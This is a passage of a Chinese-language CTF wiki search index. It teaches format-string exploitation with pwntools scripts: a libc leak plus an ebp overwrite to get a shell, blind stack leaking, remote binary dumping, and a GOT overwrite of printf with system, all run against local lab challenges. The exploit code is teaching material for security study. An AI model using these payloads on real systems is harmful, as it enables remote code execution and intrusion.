8\u9700\u8981\u6267\u884cpop ebp\u624d\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06ebp\u4fee\u6539\u4e3a\u5b58\u50a8system\u5730\u5740-4\u7684\u503c\u3002\u8fd9\u6837pop ebp\u4e4b\u540e\uff0cesp\u6070\u597d\u6307\u5411\u4fdd\u5b58system\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884cret\u6307\u4ee4\u5373\u53ef\u6267\u884csystem\u51fd\u6570\u3002\n\n\n\u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684ebp\u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a11\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684payload\u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002\n\n\npart1 = (heap_addr - 4) / 2\npart2 = heap_addr - 4 - part1\npayload = \n%\n + str(part1) + \nx%\n + str(part2) + \nx%6$n\n\n\n\n\n\n\u83b7\u53d6shell\n\n\n\u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u51655\uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6shell\u3002\n\n\n\u5229\u7528\u7a0b\u5e8f\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \n*\n\n\ncontact\n \n=\n \nELF\n(\n./contacts\n)\n\n\n##context.log_level = \ndebug\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\n11\n,\n \n111\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./contacts\n)\n\n\n\n\ndef\n \ncreatecontact\n(\nname\n,\n \nphone\n,\n \ndescrip_len\n,\n \ndescription\n):\n\n    \nsh\n.\nrecvuntil\n(\n \n)\n\n    \nsh\n.\nsendline\n(\n1\n)\n\n    \nsh\n.\nrecvuntil\n(\nContact info: \n\\n\n)\n\n    \nsh\n.\nrecvuntil\n(\nName: \n)\n\n    \nsh\n.\nsendline\n(\nname\n)\n\n    \nsh\n.\nrecvuntil\n(\nYou have 10 numbers\n\\n\n)\n\n    \nsh\n.\nsendline\n(\nphone\n)\n\n    \nsh\n.\nrecvuntil\n(\nLength of description: \n)\n\n    \nsh\n.\nsendline\n(\ndescrip_len\n)\n\n    \nsh\n.\nrecvuntil\n(\ndescription:\n\\n\\t\\t\n)\n\n    \nsh\n.\nsendline\n(\ndescription\n)\n\n\n\n\ndef\n \nprintcontact\n():\n\n    \nsh\n.\nrecvuntil\n(\n \n)\n\n    \nsh\n.\nsendline\n(\n4\n)\n\n    \nsh\n.\nrecvuntil\n(\nContacts:\n)\n\n    \nsh\n.\nrecvuntil\n(\nDescription: \n)\n\n\n\n\n## get system addr \n binsh_addr\n\n\npayload\n \n=\n \n%31$paaaa\n\n\ncreatecontact\n(\n1111\n,\n \n1111\n,\n \n111\n,\n \npayload\n)\n\n\nprintcontact\n()\n\n\nlibc_start_main_ret\n \n=\n \nint\n(\nsh\n.\nrecvuntil\n(\naaaa\n,\n \ndrop\n=\nTrue\n),\n \n16\n)\n\n\nlog\n.\nsuccess\n(\nget libc_start_main_ret addr: \n \n+\n \nhex\n(\nlibc_start_main_ret\n))\n\n\nlibc\n \n=\n \nLibcSearcher\n(\n__libc_start_main_ret\n,\n \nlibc_start_main_ret\n)\n\n\nlibc_base\n \n=\n \nlibc_start_main_ret\n \n-\n \nlibc\n.\ndump\n(\n__libc_start_main_ret\n)\n\n\nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nsystem\n)\n\n\nbinsh_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nstr_bin_sh\n)\n\n\nlog\n.\nsuccess\n(\nget system addr: \n \n+\n \nhex\n(\nsystem_addr\n))\n\n\nlog\n.\nsuccess\n(\nget binsh addr: \n \n+\n \nhex\n(\nbinsh_addr\n))\n\n\n##gdb.attach(sh)\n\n\n\n## get heap addr and ebp addr\n\n\npayload\n \n=\n \nflat\n([\n\n    \nsystem_addr\n,\n\n    \nbbbb\n,\n\n    \nbinsh_addr\n,\n\n    \n%6$p%11$pcccc\n,\n\n\n])\n\n\ncreatecontact\n(\n2222\n,\n \n2222\n,\n \n222\n,\n \npayload\n)\n\n\nprintcontact\n()\n\n\nsh\n.\nrecvuntil\n(\nDescription: \n)\n\n\ndata\n \n=\n \nsh\n.\nrecvuntil\n(\ncccc\n,\n \ndrop\n=\nTrue\n)\n\n\ndata\n \n=\n \ndata\n.\nsplit\n(\n0x\n)\n\n\nprint\n \ndata\n\n\nebp_addr\n \n=\n \nint\n(\ndata\n[\n1\n],\n \n16\n)\n\n\nheap_addr\n \n=\n \nint\n(\ndata\n[\n2\n],\n \n16\n)\n\n\n\n## modify ebp\n\n\npart1\n \n=\n \n(\nheap_addr\n \n-\n \n4\n)\n \n/\n \n2\n\n\npart2\n \n=\n \nheap_addr\n \n-\n \n4\n \n-\n \npart1\n\n\npayload\n \n=\n \n%\n \n+\n \nstr\n(\npart1\n)\n \n+\n \nx%\n \n+\n \nstr\n(\npart2\n)\n \n+\n \nx%6$n\n\n\n##print payload\n\n\ncreatecontact\n(\n3333\n,\n \n123456789\n,\n \n300\n,\n \npayload\n)\n\n\nprintcontact\n()\n\n\nsh\n.\nrecvuntil\n(\nDescription: \n)\n\n\nsh\n.\nrecvuntil\n(\nDescription: \n)\n\n\n##gdb.attach(sh)\n\n\nprint\n \nget shell\n\n\nsh\n.\nrecvuntil\n(\n \n)\n\n\n##get shell\n\n\nsh\n.\nsendline\n(\n5\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\n\n\n\u539f\u7406\n\n\n\u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684ip\u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684binary\u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884cpwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548cBROP\u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7BROP\u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c\n\n\n\n\n\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570\n\n\n\u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \n\n\n\u5229\u7528\n\n\n\n\n\u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002\n\n\n\u4f8b\u5b501-\u6cc4\u9732\u6808\n\n\n\u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939fmt_blind_stack\u4e2d\u3002\n\n\n\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570\n\n\n\u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86%p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f\n\n\n\u279c  blind_fmt_stack git:\n(\nmaster\n)\n \u2717 nc localhost \n9999\n\n%p\n0x7ffd4799beb0\nG\ufffdflag is on the stack%                          \n\n\n\n\n\u544a\u8bc9\u6211\u4eecflag\u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\n\n\n\u5229\u7528\n\n\n\u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nlog_level\n \n=\n \nerror\n\n\n\n\ndef\n \nleak\n(\npayload\n):\n\n    \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n    \nsh\n.\nsendline\n(\npayload\n)\n\n    \ndata\n \n=\n \nsh\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n    \nif\n \ndata\n.\nstartswith\n(\n0x\n):\n\n        \nprint\n \np64\n(\nint\n(\ndata\n,\n \n16\n))\n\n    \nsh\n.\nclose\n()\n\n\n\n\ni\n \n=\n \n1\n\n\nwhile\n \n1\n:\n\n    \npayload\n \n=\n \n%{}$p\n.\nformat\n(\ni\n)\n\n    \nleak\n(\npayload\n)\n\n    \ni\n \n+=\n \n1\n\n\n\n\n\n\u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230flag\n\n\n////////\n////////\n\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\nff\nflag\n{\nthi\ns_is_fla\ng\n}\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\n\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\n00\n\\x\nfe\n\\x\n7f\n\\x\n00\n\\x\n00\n\n\n\n\n\n\u4f8b\u5b502-\u76f2\u6253\u52ab\u6301got\n\n\n\u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728blind_fmt_got\u6587\u4ef6\u5939\u4e2d\u3002\n\n\n\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570\n\n\n\u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a64\u4f4d\u3002\n\n\n\u279c  blind_fmt_got git:\n(\nmaster\n)\n \u2717 nc localhost \n9999\n\n%p\n0x7fff3b9774c0\n\n\n\n\n\u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002\n\n\n\u786e\u5b9a\u504f\u79fb\n\n\n\u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b\n\n\n\u279c  blind_fmt_got git:\n(\nmaster\n)\n \u2717 nc localhost \n9999\n\naaaaaaaa%p%p%p%p%p%p%p%p%p\naaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025\n\n\n\n\n\u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a6\u3002\n\n\n\u6cc4\u9732binary\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u662f64\u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece0x400000\u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165'\\x00'\u5b57\u7b26\u7684\uff0c\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f'\\x00'\u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f'\\x00'\u622a\u65ad\u7684\u3002\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002\n\n\n##coding=utf8\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\n##context.log_level = \ndebug\n\n\nip\n \n=\n \n127.0.0.1\n\n\nport\n \n=\n \n9999\n\n\n\n\ndef\n \nleak\n(\naddr\n):\n\n    \n# leak addr for three times\n\n    \nnum\n \n=\n \n0\n\n    \nwhile\n \nnum\n \n \n3\n:\n\n        \ntry\n:\n\n            \nprint\n \nleak addr: \n \n+\n \nhex\n(\naddr\n)\n\n            \nsh\n \n=\n \nremote\n(\nip\n,\n \nport\n)\n\n            \npayload\n \n=\n \n%00008$s\n \n+\n \nSTARTEND\n \n+\n \np64\n(\naddr\n)\n\n            \n# \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c\n\n            \nif\n \n\\x0a\n \nin\n \npayload\n:\n\n                \nreturn\n \nNone\n\n            \nsh\n.\nsendline\n(\npayload\n)\n\n            \ndata\n \n=\n \nsh\n.\nrecvuntil\n(\nSTARTEND\n,\n \ndrop\n=\nTrue\n)\n\n            \nsh\n.\nclose\n()\n\n            \nreturn\n \ndata\n\n        \nexcept\n \nException\n:\n\n            \nnum\n \n+=\n \n1\n\n            \ncontinue\n\n    \nreturn\n \nNone\n\n\n\ndef\n \ngetbinary\n():\n\n    \naddr\n \n=\n \n0x400000\n\n    \nf\n \n=\n \nopen\n(\nbinary\n,\n \nw\n)\n\n    \nwhile\n \naddr\n \n \n0x401000\n:\n\n        \ndata\n \n=\n \nleak\n(\naddr\n)\n\n        \nif\n \ndata\n \nis\n \nNone\n:\n\n            \nf\n.\nwrite\n(\n\\xff\n)\n\n            \naddr\n \n+=\n \n1\n\n        \nelif\n \nlen\n(\ndata\n)\n \n==\n \n0\n:\n\n            \nf\n.\nwrite\n(\n\\x00\n)\n\n            \naddr\n \n+=\n \n1\n\n        \nelse\n:\n\n            \nf\n.\nwrite\n(\ndata\n)\n\n            \naddr\n \n+=\n \nlen\n(\ndata\n)\n\n    \nf\n.\nclose\n()\n\n\ngetbinary\n()\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728payload\u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709'\\n'\u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002\n\n\n\u5206\u6790binary\n\n\n\u5229\u7528ida\u6253\u5f00\u6cc4\u9732\u7684binary\uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8fmain\u51fd\u6570\u7684\u5730\u5740\n\n\nseg000:\n00000000004005\nF6\n                 \npush\n    \nrbp\n\n\nseg000:\n00000000004005\nF7\n                 \nmov\n     \nrbp\n,\n \nrsp\n\n\nseg000:\n00000000004005\nFA\n                 \nadd\n     \nrsp\n,\n \n0\nFFFFFFFFFFFFFF80h\n\n\nseg000:\n00000000004005\nFE\n\n\nseg000:\n00000000004005\nFE\n \nloc_4005FE\n:\n                             \n; CODE XREF: seg000:0000000000400639\u0019j\n\n\nseg000\n:\n00000000004005\nFE\n                 \nlea\n     \nrax\n,\n \n[\nrbp-80h\n]\n\n\nseg000:\n0000000000400602\n                 \nmov\n     \nedx\n,\n \n80\nh\n \n; \n\u20ac\n\n\nseg000\n:\n0000000000400607\n                 \nmov\n     \nrsi\n,\n \nrax\n\n\nseg000:\n000000000040060\nA\n                 \nmov\n     \nedi\n,\n \n0\n\n\nseg000:\n000000000040060\nF\n                 \nmov\n     \neax\n,\n \n0\n\n\nseg000:\n0000000000400614\n                 \ncall\n    \nsub_4004C0\n\n\nseg000:\n0000000000400619\n                 \nlea\n     \nrax\n,\n \n[\nrbp-80h\n]\n\n\nseg000:\n000000000040061\nD\n                 \nmov\n     \nrdi\n,\n \nrax\n\n\nseg000:\n0000000000400620\n                 \nmov\n     \neax\n,\n \n0\n\n\nseg000:\n0000000000400625\n                 \ncall\n    \nsub_4004B0\n\n\nseg000:\n000000000040062\nA\n                 \nmov\n     \nrax\n,\n \ncs\n:\n601048\nh\n\n\nseg000:\n0000000000400631\n                 \nmov\n     \nrdi\n,\n \nrax\n\n\nseg000:\n0000000000400634\n                 \ncall\n    \nnear\n \nptr\n \nunk_4004E0\n\n\nseg000:\n0000000000400639\n                 \njmp\n     \nshort\n \nloc_4005FE\n\n\n\n\n\n\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662fsub_4004C0\u4e3aread\u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662fread\u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684sub_4004B0\u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2awhile 1\u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def\n\n\n\n\n\u6cc4\u9732printf\u51fd\u6570\u7684\u5730\u5740\uff0c\n\n\n\u83b7\u53d6\u5bf9\u5e94libc\u4ee5\u53casystem\u51fd\u6570\u5730\u5740\n\n\n\u4fee\u6539printf\u5730\u5740\u4e3asystem\u51fd\u6570\u5730\u5740\n\n\n\u8bfb\u5165/bin/sh;\u4ee5\u4fbf\u4e8e\u83b7\u53d6shell\n\n\n\n\n\u5229\u7528\u7a0b\u5e8f\n\n\n\u7a0b\u5e8f\u5982\u4e0b\u3002\n\n\n##coding=utf8\n\n\nimport\n \nmath\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \nLibcSearcher\n\n\n##context.log_level = \ndebug\n\n\ncontext\n.\narch\n \n=\n \namd64\n\n\nip\n \n=\n \n127.0.0.1\n\n\nport\n \n=\n \n9999\n\n\n\n\ndef\n \nleak\n(\naddr\n):\n\n    \n# leak addr for three times\n\n    \nnum\n \n=\n \n0\n\n    \nwhile\n \nnum\n \n \n3\n:\n\n        \ntry\n:\n\n            \nprint\n \nleak addr: \n \n+\n \nhex\n(\naddr\n)\n\n            \nsh\n \n=\n \nremote\n(\nip\n,\n \nport\n)\n\n            \npayload\n \n=\n \n%00008$s\n \n+\n \nSTARTEND\n \n+\n \np64\n(\naddr\n)\n\n            \n# \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c\n\n            \nif\n \n\\x0a\n \nin\n \npayload\n:\n\n                \nreturn\n \nNone\n\n            \nsh\n.\nsendline\n(\npayload\n)\n\n            \ndata\n \n=\n \nsh\n.\nrecvuntil\n(\nSTARTEND\n,\n \ndrop\n=\nTrue\n)\n\n            \nsh\n.\nclose\n()\n\n            \nreturn\n \ndata\n\n        \nexcept\n \nException\n:\n\n            \nnum\n \n+=\n \n1\n\n            \ncontinue\n\n    \nreturn\n \nNone\n\n\n\n\ndef\n \ngetbinary\n():\n\n    \naddr\n \n=\n \n0x400000\n\n    \nf\n \n=\n \nopen\n(\nbinary\n,\n \nw\n)\n\n    \nwhile\n \naddr\n \n \n0x401000\n:\n\n        \ndata\n \n=\n \nleak\n(\naddr\n)\n\n        \nif\n \ndata\n \nis\n \nNone\n:\n\n            \nf\n.\nwrite\n(\n\\xff\n)\n\n            \naddr\n \n+=\n \n1\n\n        \nelif\n \nlen\n(\ndata\n)\n \n==\n \n0\n:\n\n            \nf\n.\nwrite\n(\n\\x00\n)\n\n            \naddr\n \n+=\n \n1\n\n        \nelse\n:\n\n            \nf\n.\nwrite\n(\ndata\n)\n\n            \naddr\n \n+=\n \nlen\n(\ndata\n)\n\n    \nf\n.\nclose\n()\n\n\n\n\n##getbinary()\n\n\nread_got\n \n=\n \n0x601020\n\n\nprintf_got\n \n=\n \n0x601018\n\n\nsh\n \n=\n \nremote\n(\nip\n,\n \nport\n)\n\n\n## let the read get resolved\n\n\nsh\n.\nsendline\n(\na\n)\n\n\nsh\n.\nrecv\n()\n\n\n## get printf addr\n\n\npayload\n \n=\n \n%00008$s\n \n+\n \nSTARTEND\n \n+\n \np64\n(\nread_got\n)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\ndata\n \n=\n \nsh\n.\nrecvuntil\n(\nSTARTEND\n,\n \ndrop\n=\nTrue\n)\n.\nljust\n(\n8\n,\n \n\\x00\n)\n\n\nsh\n.\nrecv\n()\n\n\nread_addr\n \n=\n \nu64\n(\ndata\n)\n\n\n\n## get system addr\n\n\nlibc\n \n=\n \nLibcSearcher\n(\nread\n,\n \nread_addr\n)\n\n\nlibc_base\n \n=\n \nread_addr\n \n-\n \nlibc\n.\ndump\n(\nread\n)\n\n\nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nsystem\n)\n\n\nlog\n.\nsuccess\n(\nsystem addr: \n \n+\n \nhex\n(\nsystem_addr\n))\n\n\nlog\n.\nsuccess\n(\nread   addr: \n \n+\n \nhex\n(\nread_addr\n))\n\n\n## modify printf_got\n\n\npayload\n \n=\n \nfmtstr_payload\n(\n6\n,\n \n{\nprintf_got\n:\n \nsystem_addr\n},\n \n0\n,\n \nwrite_size\n=\nshort\n)\n\n\n## get all the addr\n\n\naddr\n \n=\n \npayload\n[:\n32\n]\n\n\npayload\n \n=\n \n%32d\n \n+\n \npayload\n[\n32\n:]\n\n\noffset\n \n=\n \n(\nint\n)(\nmath\n.\nceil\n(\nlen\n(\npayload\n)\n \n/\n \n8.0\n)\n \n+\n \n1\n)\n\n\nfor\n \ni\n \nin\n \nrange\n(\n6\n,\n \n10\n):\n\n    \nold\n \n=\n \n%{}$\n.\nformat\n(\ni\n)\n\n    \nnew\n \n=\n \n%{}$\n.\nformat\n(\noffset\n \n+\n \ni\n)\n\n    \npayload\n \n=\n \npayload\n.\nreplace\n(\nold\n,\n \nnew\n)\n\n\nremainer\n \n=\n \nlen\n(\npayload\n)\n \n%\n \n8\n\n\npayload\n \n+=\n \n(\n8\n \n-\n \nremainer\n)\n \n*\n \na\n\n\npayload\n \n+=\n \naddr\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nrecv\n()\n\n\n\n## get shell\n\n\nsh\n.\nsendline\n(\n/bin/sh;\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801\n\n\n## modify printf_got\n\n\npayload\n \n=\n \nfmtstr_payload\n(\n6\n,\n \n{\nprintf_got\n:\n \nsystem_addr\n},\n \n0\n,\n \nwrite_size\n=\nshort\n)\n\n\n## get all the addr\n\n\naddr\n \n=\n \npayload\n[:\n32\n]\n\n\npayload\n \n=\n \n%32d\n \n+\n \npayload\n[\n32\n:]\n\n\noffset\n \n=\n \n(\nint\n)(\nmath\n.\nceil\n(\nlen\n(\npayload\n)\n \n/\n \n8.0\n)\n \n+\n \n1\n)\n\n\nfor\n \ni\n \nin\n \nrange\n(\n6\n,\n \n10\n):\n\n    \nold\n \n=\n \n%{}$\n.\nformat\n(\ni\n)\n\n    \nnew\n \n=\n \n%{}$\n.\nformat\n(\noffset\n \n+\n \ni\n)\n\n    \npayload\n \n=\n \npayload\n.\nreplace\n(\nold\n,\n \nnew\n)\n\n\nremainer\n \n=\n \nlen\n(\npayload\n)\n \n%\n \n8\n\n\npayload\n \n+=\n \n(\n8\n \n-\n \nremainer\n)\n \n*\n \na\n\n\npayload\n \n+=\n \naddr\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nrecv\n()\n\n\n\n\n\nfmtstr_payload\u76f4\u63a5\u5f97\u5230\u7684payload\u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4printf\u7684\u65f6\u5019'\\x00'\u622a\u65ad\uff08\n\u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools\u76ee\u524d\u6b63\u5728\u5f00\u53d1fmt_payload\u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002\n\uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u97628\u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9payload\u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\n\n\noffset\n \n=\n \n(\nint\n)(\nmath\n.\nceil\n(\nlen\n(\npayload\n)\n \n/\n \n8.0\n)\n \n+\n \n1\n)\n\n\n\n\n\n\u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e'%order$hn'\u4e2dorder\u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_1", 
            "text": "\u4e0b\u9762\u4f1a\u4ecb\u7ecd\u4e00\u4e9bCTF\u4e2d\u7684\u683c\u5f0f\u5316\u6f0f\u6d1e\u7684\u9898\u76ee\u3002\u4e5f\u90fd\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5e38\u89c1\u7684\u5229\u7528\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#64", 
            "text": "", 
